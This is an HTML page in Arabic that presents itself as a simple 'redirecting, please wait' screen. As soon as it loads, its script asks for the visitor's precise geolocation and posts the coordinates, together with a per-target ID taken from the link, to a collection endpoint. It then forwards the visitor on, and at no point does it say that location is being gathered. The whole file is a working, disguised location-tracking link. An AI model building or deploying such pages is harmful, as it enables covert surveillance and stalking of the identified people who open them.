<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التوجيه...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
    </style>
</head>
<body>
    <h1>جاري التحويل، يرجى الانتظار...</h1>
    <p>إذا لم يتم تحويلك تلقائياً، <a href="#" id="manualRedirect">اضغط هنا</a>.</p>

    <script>
        // الحصول على معرف المستخدم من رابط الصفحة
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id');

        // دالة للحصول على الموقع
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    // عند النجاح
                    (position) => {
                        const { latitude, longitude, accuracy } = position.coords;
                        sendLocation(latitude, longitude, accuracy);
                    },
                    // عند الخطأ
                    (error) => {
                        console.error('خطأ في الحصول على الموقع:', error);
                        // حتى لو فشل الحصول على الموقع، نرسل بيانات فارغة ونحوله
                        sendLocation(null, null, null);
                    },
                    // خيارات: زيادة الدقة والسرعة
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                alert('المتصفح لا يدعم خدمة الموقع الجغرافي');
                sendLocation(null, null, null);
            }
        }

        // دالة لإرسال الموقع إلى الخادم
        async function sendLocation(lat, lon, acc) {
            try {
                const response = await fetch('/api/location', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        id: userId,
                        latitude: lat,
                        longitude: lon,
                        accuracy: acc
                    })
                });

                const data = await response.json();
                
                // بعد إرسال الموقع، توجيه المستخدم إلى الرابط المطلوب
                if (data.redirectUrl) {
                    window.location.href = data.redirectUrl;
                } else {
                    // إذا لم يكن هناك رابط توجيه، نذهب إلى Google
                    window.location.href = 'https://www.google.com';
                }
            } catch (error) {
                console.error('خطأ في إرسال البيانات:', error);
                // في حالة خطأ، نوجه المستخدم إلى Google
                window.location.href = 'https://www.google.com';
            }
        }

        // عند تحميل الصفحة، نبدأ عملية الحصول على الموقع
        window.onload = getLocation;

        // رابط التحويل اليدوي في حالة فشل التوجيه التلقائي
        document.getElementById('manualRedirect').addEventListener('click', () => {
            window.location.href = 'https://www.google.com';
        });
    </script>
</body>
</html>
